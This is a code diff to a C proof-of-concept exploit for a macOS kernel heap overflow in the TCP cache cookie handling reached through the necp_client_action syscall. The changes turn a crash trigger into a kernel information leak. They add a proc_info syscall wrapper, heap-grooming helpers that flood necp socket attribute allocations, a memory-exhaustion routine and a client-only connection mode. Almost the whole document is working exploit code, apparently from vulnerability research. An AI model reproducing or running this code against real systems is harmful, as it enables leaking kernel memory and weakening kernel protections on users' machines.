@@ -1,14 +1,16 @@
 //This POC causes a kernel heap overflow in tcp_cache_set_cookie_common (see bsd/netinet/tcp_cache.c).  A
 //user-supplied length is passed to memcpy, which causes the destination struct tcp_cache allocation to be overflown.
 //Unfortunately, the size of the source memory object is limited, so we cannot directly control the contents copied to the
-//overflown area.  The source memory object is on the stack (tfo_cache_buffer in necp_client_update_cache).  More analysis is
-//needed to determine how much control of the stack based objects after the source memory object is possible.
+//overflown area.  The source memory object is on the stack (tfo_cache_buffer in necp_client_update_cache).
+//This POC uses this vulnerability to leak kernel information.
 //
 //The stack trace at the time of the overflow is:
 //tcp_cache_set_cookie_common
 //tcp_heuristics_tfo_update
 //necp_client_update_cache
 //necp_client_action (syscall)
+
+#pragma clang diagnostic ignored "-Wdeprecated-declarations"
 
 #include <arpa/inet.h>
 #include <errno.h>
@@ -108,6 +110,7 @@ struct tlv
 static int sockets[MAX_SOCKETS];
 const char * sockets_ip = "127.0.0.1";
 int socket_port_num = 3333;
+int client_only = 0;
 
 static int connected_sockets[3];
 static int necp_fd;
@@ -117,24 +120,25 @@ static uuid_t necp_client_id;
 // Helper functions ////////////////////////////////////////////////////////////////////////////////
 ////////////////////////////////////////////////////////////////////////////////////////////////////
 
+//necp_open syscall wrapper
 int necp_open(int flags)
 {
 	return syscall(501, flags);
 }
 
+//necp_client_action syscall wrapper
 int necp_client_action(int necp_fd, uint32_t action, uuid_t client_id, size_t client_id_len, uint8_t *buffer, size_t buffer_size)
 {
 	return syscall(502, necp_fd, action, client_id, client_id_len, buffer, buffer_size);
 }
 
-void print_uuid(char * caption, uuid_t * uuid)
+//proc_info syscall wrapper
+int proc_info(int32_t callnum,int32_t pid,uint32_t flavor, uint64_t arg, void * buffer,int32_t buffersize)
 {
-	unsigned char * uuid_char = (unsigned char *)uuid;
-	printf("%s: %02x%02x%02x%02x-%02x%02x-%02x%02x-%02x%02x-%02x%02x%02x%02x%02x%02x\n", caption,
-		uuid_char[0], uuid_char[1], uuid_char[2], uuid_char[3], uuid_char[4], uuid_char[5], uuid_char[6], uuid_char[7],
-		uuid_char[8], uuid_char[9], uuid_char[10], uuid_char[11], uuid_char[12], uuid_char[13], uuid_char[14], uuid_char[15]);
+	return syscall(336, callnum, pid, flavor, arg, buffer, buffersize);
 }
 
+//Gets a connected socket
 void create_connected_socket(int * socks)
 {
 	int server_sock, client_sock;
@@ -143,42 +147,51 @@ void create_connected_socket(int * socks)
 	struct sockaddr_in addr;
 	socklen_t addr_len;
 
-	//Create the socket pair
-
-	server_sock = socket(PF_INET, SOCK_STREAM, 0);
-	if(server_sock < 0) {
-		printf("Couldn't create server socket: errno %d: %s\n", errno, strerror(errno));
-		exit(1);
-	}
 	client_sock = socket(PF_INET, SOCK_STREAM, 0);
 	if(client_sock < 0) {
 		printf("Couldn't create client socket: errno %d: %s\n", errno, strerror(errno));
 		exit(1);
 	}
 
-	//Bind the server to a port
-	opt = 1;
-	setsockopt(server_sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
-
-	while(1)
+	if(client_only)
 	{
 		memset(&addr, 0, sizeof(addr));
 		addr.sin_family = AF_INET;
 		addr.sin_addr.s_addr = inet_addr(sockets_ip);
 		addr.sin_port = htons(socket_port_num);
-		socket_port_num++;
-
-		if(bind(server_sock, (struct sockaddr *)&addr, sizeof(addr)) >= 0)
-			break;
-		bind_count++;
-		if(bind_count == 10) {
-			printf("Couldn't bind to the socket: errno %d: %s\n", errno, strerror(errno));
+	}
+	else
+	{
+		server_sock = socket(PF_INET, SOCK_STREAM, 0);
+		if(server_sock < 0) {
+			printf("Couldn't create server socket: errno %d: %s\n", errno, strerror(errno));
 			exit(1);
 		}
-	}
-	if(listen(server_sock, 5) < 0) {
-		printf("Couldn't listen on the socket: errno %d: %s\n", errno, strerror(errno));
-		exit(1);
+
+		//Bind the server to a port
+		opt = 1;
+		setsockopt(server_sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
+
+		while(1)
+		{
+			memset(&addr, 0, sizeof(addr));
+			addr.sin_family = AF_INET;
+			addr.sin_addr.s_addr = inet_addr(sockets_ip);
+			addr.sin_port = htons(socket_port_num);
+			socket_port_num++;
+
+			if(bind(server_sock, (struct sockaddr *)&addr, sizeof(addr)) >= 0)
+				break;
+			bind_count++;
+			if(bind_count == 10) {
+				printf("Couldn't bind to the socket: errno %d: %s\n", errno, strerror(errno));
+				exit(1);
+			}
+		}
+		if(listen(server_sock, 5) < 0) {
+			printf("Couldn't listen on the socket: errno %d: %s\n", errno, strerror(errno));
+			exit(1);
+		}
 	}
 
 	//Connect to the server from the client
@@ -187,21 +200,25 @@ void create_connected_socket(int * socks)
 		exit(1);
 	}
 
-	addr_len = sizeof(addr);
-	socks[2] = accept(server_sock, (struct sockaddr *)&addr, &addr_len);
-	if(socks[2] < 0)
+	if(!client_only)
 	{
-		printf("Couldn't accept the socket: errno %d: %s\n", errno, strerror(errno));
-		exit(1);
+		addr_len = sizeof(addr);
+		socks[2] = accept(server_sock, (struct sockaddr *)&addr, &addr_len);
+		if(socks[2] < 0)
+		{
+			printf("Couldn't accept the socket: errno %d: %s\n", errno, strerror(errno));
+			exit(1);
+		}
+		socks[1] = server_sock;
 	}
-	socks[1] = server_sock;
 	socks[0] = client_sock;
 }
 
 ////////////////////////////////////////////////////////////////////////////////////////////////////
-// Exploit step functions //////////////////////////////////////////////////////////////////////////
+// Exploit helper functions ////////////////////////////////////////////////////////////////////////
 ////////////////////////////////////////////////////////////////////////////////////////////////////
 
+//Open a large number of sockets so that we can later set their necp attribute strings
 static void prep_attribute_flood(int number)
 {
 	int i;
@@ -224,6 +241,7 @@ static void prep_attribute_flood(int number)
 	}
 }
 
+//Set a socket's necp attribute strings with the given content
 static inline void set_attributes_with_content(int sock, int num_attributes, int length, char * content, char * content2)
 {
 	struct tlv * value, * current;
@@ -259,6 +277,7 @@ static inline void set_attributes_with_content(int sock, int num_attributes, int
 	}
 }
 
+//Set a socket's necp attribute strings
 static inline void set_attributes(int sock, int num_attributes)
 {
 	char buffer[80];
@@ -266,32 +285,7 @@ static inline void set_attributes(int sock, int num_attributes)
 	set_attributes_with_content(sock, num_attributes, 79, buffer, buffer); 
 }
 
-static inline uint64_t print_attributes(int sock)
-{
-	unsigned char * buffer, * value;
-	struct tlv * current;
-	socklen_t buffer_size, i;
-	uint32_t len;
-
-	buffer_size = 100;
-	buffer = malloc(buffer_size);
-	memset(buffer, 0, buffer_size);
-
-	if(getsockopt(sock, SOL_SOCKET, SO_NECP_ATTRIBUTES, buffer, &buffer_size) < 0)
-	{
-		printf("getsockopt failed: errno %d: %s\n", errno, strerror(errno));
-		exit(1);
-	}
-
-	printf("print_attributes buffer_size %u:\n", buffer_size);
-	for(i = 0; i < buffer_size; i++)
-		printf("%02X", buffer[i]);
-	printf("\n");
-
-	//free(buffer);
-	return 0;
-}
-
+//Get a socket's necp attribute strings if they've changed from what was set
 static inline uint64_t get_attributes(int sock)
 {
 	unsigned char * buffer, * value;
@@ -326,6 +320,7 @@ static inline uint64_t get_attributes(int sock)
 	return 0;
 }
 
+//Allocate a large number of necp attributes
 static void allocate_many_attributes(int number)
 {
 	struct tlv * value, * current;
@@ -335,7 +330,7 @@ static void allocate_many_attributes(int number)
 
 	if(number > MAX_SOCKETS)
 	{
-		printf("Can't ask for more than %d sockets (asked for %d\n", MAX_SOCKETS, number);
+		printf("Can't ask for more than %d sockets (asked for %d)\n", MAX_SOCKETS, number);
 		exit(1);
 	}
 
@@ -361,6 +356,7 @@ static void allocate_many_attributes(int number)
 	free(value);
 }
 
+//Close the sockets we opened for the necp attribute strings
 static void close_sockets(int number)
 {
 	int i;
@@ -378,6 +374,7 @@ static void close_sockets(int number)
 	}
 }
 
+//Setup the connected socket that we'll use in the overflow.  Attach it to a new necp client fd.
 static void tcp_cache_prep(void)
 {
 	int ret;
@@ -403,7 +400,6 @@ static void tcp_cache_prep(void)
 		printf("Couldn't add a necp client: errno %d: %s\n", errno, strerror(errno));
 		exit(1);
 	}
-	//print_uuid("client uuid:", necp_client_id);
 
 	//Create a socket and add a flow to the client
 	create_connected_socket(connected_sockets);
@@ -414,14 +410,18 @@ static void tcp_cache_prep(void)
 	}
 }
 
+//Close the file descriptors associated with the necp fd
 static void tcp_cache_cleanup(void)
 {
 	close(connected_sockets[0]);
-	close(connected_sockets[1]);
-	close(connected_sockets[2]);
+	if(!client_only) {
+		close(connected_sockets[1]);
+		close(connected_sockets[2]);
+	}
 	close(necp_fd);
 }
 
+//Update the cache info for the necp fd.  This will exercise the vulnerability if cookie_len > 16
 static void set_necp_tcp_cache(int cookie_len)
 {
 	necp_cache_buffer ncb;
@@ -447,10 +447,12 @@ static void set_necp_tcp_cache(int cookie_len)
 	}
 }
 
+//Flood the memory of the current system to force it to free any pages it can
 void memory_flood(void)
 {
 	pid_t child;
 	int i, status;
+	const char * argv[4] = {"python", "-c", "'a=range(0,10);a*=100000000'", NULL};
 	
 	child = fork();
 	if(child < 0)
@@ -461,17 +463,13 @@ void memory_flood(void)
 
 	if(child == 0)
 	{
-		system("python -c 'a=range(0,10);a*=100000000'");
-		exit(0);
+		execve("/usr/bin/python", (char *const*)argv, NULL);
+		exit(1);
 	}
 
 	sleep(5);
-	for(i = 0; i < 5; i++)
-	{
-		kill(child, SIGKILL);
-		kill(child, SIGTERM);
-		sleep(1);
-	}
+	kill(child, SIGKILL);
+	kill(child, SIGTERM);
 	wait4(child, &status, 0, NULL);
 }
 
@@ -516,10 +514,14 @@ int main(int argc, char ** argv)
 	struct rlimit rlp;
 	uint64_t kernel_ptr;
 
-	if(argc > 1)
+	if(argc > 1) {
+		client_only = 1;
 		sockets_ip = argv[1];
+		if(argc > 2)
+			socket_port_num = atoi(argv[2]);
+	}
 
-	printf("Running exploit from process %d using ip %s\n", getpid(), sockets_ip);
+	printf("Running leak from process %d using ip %s\n", getpid(), sockets_ip);
 
 	//Step -1: Get the kernel to release any completely free pages
 	memory_flood();
